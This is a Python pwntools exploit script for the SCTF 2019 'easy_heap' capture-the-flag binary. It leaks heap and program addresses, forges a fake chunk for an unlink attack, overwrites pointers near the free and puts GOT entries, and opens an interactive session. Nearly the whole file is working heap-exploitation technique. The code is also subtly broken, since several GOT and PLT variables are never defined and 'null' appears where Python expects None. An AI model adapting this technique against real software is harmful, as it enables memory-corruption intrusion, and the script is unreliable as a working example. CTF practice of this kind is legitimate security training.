# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './sctf_2019_easy_heap'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size):
    cmd(1)
    sla("Size:",size)
    ru("Address ")
    return rint()

def delete(idx):
    cmd(2)
    sla("Index:",idx)

def edit(idx,text):
    cmd(3)
    sla("Index:",idx)
    sa("Content:",text)

one_gad = one_gadget(libc.path)

ru("Mmap: ")
mmap_addr = int( p.recv(12)[2:] , 16)

add(0x58)
bss_addr = add(0x58) 

elf.address = bss_addr - 0x202068



add(0x4f0) 
lg("bss_addr",bss_addr)

add(0x58) 

payload  = p64(0) + p64(0x20)
payload += p64(bss_addr - 0x18) + p64(bss_addr - 0x10)
payload += p64(0x20)+ p64(0)*5 + p64(0x50)

edit(1,payload)
delete(2)

payload  = p64(0x8)  + p64(free_got)
payload += p64(0x8)  + p64(puts_got + 8)
payload += p64(0x58) + p64(mmap_addr)

edit(1,payload + "\n")

dbg()

edit(0,p64(puts_plt)[:-1] + "\n")

dbg()

p.interactive()

'''
@File    :   sctf_2019_easy_heap.py
@Time    :   2021/08/10 12:00:03
@Author  :   Niyah 
'''